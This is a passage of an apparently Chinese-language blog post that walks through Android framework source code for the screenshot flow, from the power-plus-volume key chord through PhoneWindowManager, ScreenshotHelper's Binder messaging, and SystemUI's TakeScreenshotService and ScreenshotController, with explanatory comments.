class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initKeyCombinationRules</span><span class="params">()</span> &#123;</span><br><span class="line">    mKeyCombinationManager = <span class="keyword">new</span> <span class="title class_">KeyCombinationManager</span>(mHandler);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">screenshotChordEnabled</span> <span class="operator">=</span> mContext.getResources().getBoolean(</span><br><span class="line">            com.android.internal.R.bool.config_enableScreenshotChord);</span><br><span class="line">    <span class="keyword">if</span> (screenshotChordEnabled) &#123;</span><br><span class="line">        mKeyCombinationManager.addRule(</span><br><span class="line">                <span class="comment">// 截屏组合键的添加</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">TwoKeysCombinationRule</span>(KEYCODE_VOLUME_DOWN, KEYCODE_POWER) &#123;</span><br><span class="line">                    <span class="comment">// 触发组合键后回调</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">                        mPowerKeyHandled = <span class="literal">true</span>;</span><br><span class="line">                        <span class="comment">// 发消息准备屏幕截图</span></span><br><span class="line">                        interceptScreenshotChord(TAKE_SCREENSHOT_FULLSCREEN,</span><br><span class="line">                                SCREENSHOT_KEY_CHORD, getScreenshotChordLongPressDelay());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 取消</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">void</span> <span class="title function_">cancel</span><span class="params">()</span> &#123;</span><br><span class="line">                        cancelPendingScreenshotChordAction();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面通过 handle 发了一个消息，将会调用 <strong>handleScreenShot()</strong> 方法，处理截屏：<br><strong>PhoneWindowManager# handleScreenShot()</strong><br><strong>frameworks/base/services/core/java/com/android/server/policy/PhoneWindowManager.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleScreenShot</span><span class="params">(<span class="meta">@WindowManager</span>.ScreenshotType <span class="type">int</span> type,</span></span><br><span class="line"><span class="params">        <span class="meta">@WindowManager</span>.ScreenshotSource <span class="type">int</span> source)</span> &#123;</span><br><span class="line">    <span class="comment">// 回调到 DisplayPolicy.java</span></span><br><span class="line">    mDefaultDisplayPolicy.takeScreenshot(type, source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DisplayPolicy#takeScreenshot()</strong><br><strong>frameworks/base/services/core/java/com/android/server/wm/DisplayPolicy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求截取屏幕截图</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(<span class="type">int</span> screenshotType, <span class="type">int</span> source)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mScreenshotHelper != <span class="literal">null</span>) &#123;</span><br><span class="line">        mScreenshotHelper.takeScreenshot(screenshotType,</span><br><span class="line">                getStatusBar() != <span class="literal">null</span> &amp;&amp; getStatusBar().isVisible(),</span><br><span class="line">                getNavigationBar() != <span class="literal">null</span> &amp;&amp; getNavigationBar().isVisible(),</span><br><span class="line">                source, mHandler, <span class="literal">null</span> <span class="comment">/* completionConsumer */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续往下看 <strong>ScreenshotHelper#takeScreenshot()</strong><br><strong>frameworks/base/core/java/com/android/internal/util/ScreenshotHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> screenshotType, <span class="keyword">final</span> <span class="type">boolean</span> hasStatus,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> hasNav, <span class="type">int</span> source, <span class="meta">@NonNull</span> Handler handler,</span></span><br><span class="line"><span class="params">        <span class="meta">@Nullable</span> Consumer&lt;Uri&gt; completionConsumer)</span> &#123;</span><br><span class="line">    <span class="comment">// 截图请求</span></span><br><span class="line">    <span class="type">ScreenshotRequest</span> <span class="variable">screenshotRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScreenshotRequest</span>(source, hasStatus, hasNav);</span><br><span class="line">    takeScreenshot(screenshotType, SCREENSHOT_TIMEOUT_MS, handler, screenshotRequest,</span><br><span class="line">            completionConsumer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//到了 Binder调用环节, 此为客户端, 服务端为SystemUI中的 TakeScreenshotService</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">takeScreenshot</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> screenshotType, <span class="type">long</span> timeoutMs, <span class="meta">@NonNull</span> Handler handler,</span></span><br><span class="line"><span class="params">            ScreenshotRequest screenshotRequest, <span class="meta">@Nullable</span> Consumer&lt;Uri&gt; completionConsumer)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Runnable</span> <span class="variable">mScreenshotTimeout</span> <span class="operator">=</span> () -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mScreenshotConnection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 在获取屏幕截图捕获响应之前超时</span></span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;Timed out before getting screenshot capture response&quot;</span>);</span><br><span class="line">                        <span class="comment">// 重置连接</span></span><br><span class="line">                        resetConnection();</span><br><span class="line">                        <span class="comment">// 通知截屏错误</span></span><br><span class="line">                        notifyScreenshotError();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                    completionConsumer.accept(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> Message.obtain(<span class="literal">null</span>, screenshotType, screenshotRequest);</span><br><span class="line">            <span class="type">Handler</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Handler</span>(handler.getLooper()) &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">                    <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">                        <span class="keyword">case</span> SCREENSHOT_MSG_URI:</span><br><span class="line">                            <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                                completionConsumer.accept((Uri) msg.obj);</span><br><span class="line">                            &#125;</span><br><span class="line">                            handler.removeCallbacks(mScreenshotTimeout);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> SCREENSHOT_MSG_PROCESS_COMPLETE:</span><br><span class="line">                            <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                                resetConnection();</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            msg.replyTo = <span class="keyword">new</span> <span class="title class_">Messenger</span>(h);</span><br><span class="line">            <span class="keyword">if</span> (mScreenshotConnection == <span class="literal">null</span> || mScreenshotService == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 一个标准的Service连接</span></span><br><span class="line">                <span class="comment">// config_screenshotServiceComponent == com.android.systemui/com.android.systemui.screenshot.TakeScreenshotService</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">ComponentName</span> <span class="variable">serviceComponent</span> <span class="operator">=</span> ComponentName.unflattenFromString(</span><br><span class="line">                        mContext.getResources().getString(</span><br><span class="line">                                com.android.internal.R.string.config_screenshotServiceComponent));</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Intent</span> <span class="variable">serviceIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                serviceIntent.setComponent(serviceComponent);</span><br><span class="line">                <span class="type">ServiceConnection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceConnection</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">// 当Service连接成功之后</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> &#123;</span><br><span class="line">                        <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (mScreenshotConnection != <span class="built_in">this</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            mScreenshotService = service;</span><br><span class="line">                            <span class="type">Messenger</span> <span class="variable">messenger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messenger</span>(mScreenshotService);</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="comment">// 进程通信，发送请求截图消息</span></span><br><span class="line">                                messenger.send(msg);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                                Log.e(TAG, <span class="string">&quot;Couldn&#x27;t take screenshot: &quot;</span> + e);</span><br><span class="line">                                <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    completionConsumer.accept(<span class="literal">null</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="comment">// 当Service断开连接时</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onServiceDisconnected</span><span class="params">(ComponentName name)</span> &#123;</span><br><span class="line">                        <span class="keyword">synchronized</span> (mScreenshotLock) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (mScreenshotConnection != <span class="literal">null</span>) &#123;</span><br><span class="line">                                resetConnection();</span><br><span class="line">                                <span class="comment">// only log an error if we&#x27;re still within the timeout period</span></span><br><span class="line">                                <span class="keyword">if</span> (handler.hasCallbacks(mScreenshotTimeout)) &#123;</span><br><span class="line">                                    handler.removeCallbacks(mScreenshotTimeout);</span><br><span class="line">                                    notifyScreenshotError();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">// 绑定服务 TakeScreenshotService；</span></span><br><span class="line">                <span class="comment">// 绑定成功为true，不成功则发绑定超时消息</span></span><br><span class="line">                <span class="keyword">if</span> (mContext.bindServiceAsUser(serviceIntent, conn,</span><br><span class="line">                        Context.BIND_AUTO_CREATE | Context.BIND_FOREGROUND_SERVICE,</span><br><span class="line">                        UserHandle.CURRENT)) &#123;</span><br><span class="line">                    mScreenshotConnection = conn;</span><br><span class="line">                    handler.postDelayed(mScreenshotTimeout, timeoutMs);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果已经连接则直接发送Message</span></span><br><span class="line">                <span class="type">Messenger</span> <span class="variable">messenger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messenger</span>(mScreenshotService);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    messenger.send(msg);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                    Log.e(TAG, <span class="string">&quot;Couldn&#x27;t take screenshot: &quot;</span> + e);</span><br><span class="line">                    <span class="keyword">if</span> (completionConsumer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        completionConsumer.accept(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                handler.postDelayed(mScreenshotTimeout, timeoutMs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端通过向服务端发送 message 来将截屏任务交给 service，由 service 处理后面的操作。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/TakeScreenshotService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过 Binder (Messenger) 响应传入消息</span></span><br><span class="line"><span class="meta">@MainThread</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取客户端传的 Messenger 对象</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Messenger</span> <span class="variable">replyTo</span> <span class="operator">=</span> msg.replyTo;</span><br><span class="line">    <span class="comment">// reportUri(replyTo, uri)  方法，Messenger 双向通信，</span></span><br><span class="line">    <span class="comment">// 在服务端用远程客户端的 Messenger 对象给客户端发送信息</span></span><br><span class="line">    <span class="keyword">final</span> Consumer&lt;Uri&gt; uriConsumer = (uri) -&gt; reportUri(replyTo, uri);</span><br><span class="line">    <span class="type">RequestCallback</span> <span class="variable">requestCallback</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestCallbackImpl</span>(replyTo);</span><br><span class="line">    <span class="comment">// 如果此用户的存储空间被锁定，我们就没有地方可以存储屏幕截图，</span></span><br><span class="line">    <span class="comment">// 因此请跳过截屏，而不是显示误导性的动画和错误通知。</span></span><br><span class="line">    <span class="keyword">if</span> (!mUserManager.isUserUnlocked()) &#123;</span><br><span class="line">        mNotificationsController.notifyScreenshotError(</span><br><span class="line">                R.string.screenshot_failed_to_save_user_locked_text);</span><br><span class="line">        requestCallback.reportError();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mDevicePolicyManager.getScreenCaptureDisabled(<span class="literal">null</span>, UserHandle.USER_ALL)) &#123;</span><br><span class="line">        mBgExecutor.execute(() -&gt; &#123;</span><br><span class="line">            <span class="comment">// 跳过屏幕截图，因为 IT 管理员已禁用设备上的“+”屏幕截图</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">blockedByAdminText</span> <span class="operator">=</span> mDevicePolicyManager.getResources().getString(</span><br><span class="line">                    SCREENSHOT_BLOCKED_BY_ADMIN,</span><br><span class="line">                    () -&gt; mContext.getString(R.string.screenshot_blocked_by_admin));</span><br><span class="line">            mHandler.post(() -&gt;</span><br><span class="line">                    Toast.makeText(mContext, blockedByAdminText, Toast.LENGTH_SHORT).show());</span><br><span class="line">            requestCallback.reportError();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ScreenshotHelper.<span class="type">ScreenshotRequest</span> <span class="variable">screenshotRequest</span> <span class="operator">=</span></span><br><span class="line">            (ScreenshotHelper.ScreenshotRequest) msg.obj;</span><br><span class="line">    <span class="type">ComponentName</span> <span class="variable">topComponent</span> <span class="operator">=</span> screenshotRequest.getTopComponent();</span><br><span class="line">    mUiEventLogger.log(ScreenshotEvent.getScreenshotSource(screenshotRequest.getSource()), <span class="number">0</span>,</span><br><span class="line">            topComponent == <span class="literal">null</span> ? <span class="string">&quot;&quot;</span> : topComponent.getPackageName());</span><br><span class="line">    <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">        <span class="keyword">case</span> WindowManager.TAKE_SCREENSHOT_FULLSCREEN:</span><br><span class="line">            <span class="comment">// 全屏截图</span></span><br><span class="line">            mScreenshot.takeScreenshotFullscreen(topComponent, uriConsumer, requestCallback);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WindowManager.TAKE_SCREENSHOT_SELECTED_REGION:</span><br><span class="line">            <span class="comment">// 截取所选区域</span></span><br><span class="line">            mScreenshot.takeScreenshotPartial(topComponent, uriConsumer, requestCallback);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WindowManager.TAKE_SCREENSHOT_PROVIDED_IMAGE:</span><br><span class="line">            <span class="comment">// 截取提供的图像</span></span><br><span class="line">            <span class="type">Bitmap</span> <span class="variable">screenshot</span> <span class="operator">=</span> ScreenshotHelper.HardwareBitmapBundler.bundleToHardwareBitmap(</span><br><span class="line">                    screenshotRequest.getBitmapBundle());</span><br><span class="line">            <span class="type">Rect</span> <span class="variable">screenBounds</span> <span class="operator">=</span> screenshotRequest.getBoundsInScreen();</span><br><span class="line">            <span class="type">Insets</span> <span class="variable">insets</span> <span class="operator">=</span> screenshotRequest.getInsets();</span><br><span class="line">            <span class="type">int</span> <span class="variable">taskId</span> <span class="operator">=</span> screenshotRequest.getTaskId();</span><br><span class="line">            <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> screenshotRequest.getUserId();</span><br><span class="line">            <span class="keyword">if</span> (screenshot == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 从屏幕截图消息中获得空位图</span></span><br><span class="line">                mNotificationsController.notifyScreenshotError(</span><br><span class="line">                        R.string.screenshot_failed_to_capture_text);</span><br><span class="line">                requestCallback.reportError();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mScreenshot.handleImageAsScreenshot(screenshot, screenBounds, insets,</span><br><span class="line">                        taskId, userId, topComponent, uriConsumer, requestCallback);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 无效的屏幕截图选项</span></span><br><span class="line">            Log.w(TAG, <span class="string">&quot;Invalid screenshot option: &quot;</span> + msg.what);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TakeScreenshotService 调用 <strong>ScreenshotController.java</strong> 的 <strong>takeScreenshotFullscreen()</strong> ；<br><strong>ScreenshotController#takeScreenshotFullscreen()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/ScreenshotController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">takeScreenshotFullscreen</span><span class="params">(ComponentName topComponent, Consumer&lt;Uri&gt; finisher,</span></span><br><span class="line"><span class="params">        RequestCallback requestCallback)</span> &#123;</span><br><span class="line">    <span class="comment">// 断言，是主线程则继续执行，不是则抛出异常。</span></span><br><span class="line">    Assert.isMainThread();</span><br><span class="line">    mCurrentRequestCallback = requestCallback;</span><br><span class="line">    <span class="type">DisplayMetrics</span> <span class="variable">displayMetrics</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DisplayMetrics</span>();</span><br><span class="line">    getDefaultDisplay().getRealMetrics(displayMetrics);</span><br><span class="line">    takeScreenshotInternal(</span><br><span class="line">            topComponent, finisher,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Rect</span>(<span class="number">0</span>, <span class="number">0</span>, displayMetrics.widthPixels, displayMetrics.heightPixels));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取当前显示的屏幕截图并显示动画。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">takeScreenshotInternal</span><span class="params">(ComponentName topComponent, Consumer&lt;Uri&gt; finisher,</span></span><br><span class="line"><span class="params">        Rect crop)</span> &#123;</span><br><span class="line">    mScreenshotTakenInPortrait =</span><br><span class="line">            mContext.getResources().getConfiguration().orientation == ORIENTATION_PORTRAIT;</span><br><span class="line">    <span class="comment">// 复制输入 Rect，因为 SurfaceControl.screenshot 可以改变它</span></span><br><span class="line">    <span class="type">Rect</span> <span class="variable">screenRect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rect</span>(crop);</span><br><span class="line">    <span class="comment">// 截图</span></span><br><span class="line">    <span class="type">Bitmap</span> <span class="variable">screenshot</span> <span class="operator">=</span> captureScreenshot(crop);</span><br><span class="line">    <span class="comment">// 屏幕截图位图为空</span></span><br><span class="line">    <span class="keyword">if</span> (screenshot == <span class="literal">null</span>) &#123;</span><br><span class="line">        mNotificationsController.notifyScreenshotError(</span><br><span class="line">                R.string.screenshot_failed_to_capture_text);</span><br><span class="line">        <span class="keyword">if</span> (mCurrentRequestCallback != <span class="literal">null</span>) &#123;</span><br><span class="line">            mCurrentRequestCallback.reportError();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存截图</span></span><br><span class="line">    saveScreenshot(screenshot, finisher, screenRect, Insets.NONE, topComponent, <span class="literal">true</span>);</span><br><span class="line">    mBroadcastSender.sendBroadcast(<span class="keyword">new</span> <span class="title class_">Intent</span>(ClipboardOverlayController.SCREENSHOT_ACTION),</span><br><span class="line">            ClipboardOverlayController.SELF_PERMISSION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何截图的呢？这里我们看 <strong>captureScreenshot()</strong> 方法;<br><strong>ScreenshotController#captureScreenshot()</strong><br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/screenshot/ScreenshotController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Bitmap <span class="title function_">captureScreenshot</span><span class="params">(Rect crop)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> crop.width();</span><br><span class="line">    <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> crop.height();</span><br><span class="line">    <span class="type">Bitmap</span> <span class="variable">screenshot</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Display</span> <span class="variable">display</span> <span class="operator">=</span> getDefaultDisplay();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">DisplayAddress</span> <span class="variable">address</span> <span class="operator">=</span> display.getAddress();</span><br><span class="line">    <span class="keyword">if</span> (!(address <span class="keyword">instanceof</span> DisplayAddress.Physical)) &#123;</span><br><span class="line">        Log.e(TAG, <span class="string">&quot;Skipping Screenshot - Default display does not have a physical address: &quot;</span></span><br><span class="line">                + display);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> DisplayAddress.<span class="type">Physical</span> <span class="variable">physicalAddress</span> <span class="operator">=</span> (DisplayAddress.Physical) address;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">IBinder</span> <span class="variable">displayToken</span> <span class="operator">=</span> SurfaceControl.getPhysicalDisplayToken(</span><br><span class="line">                physicalAddress.getPhysicalDisplayId());</span><br><span class="line">        <span class="comment">// 捕获参数</span></span><br><span class="line">        <span class="keyword">final</span> SurfaceControl.<span class="type">DisplayCaptureArgs</span> <span 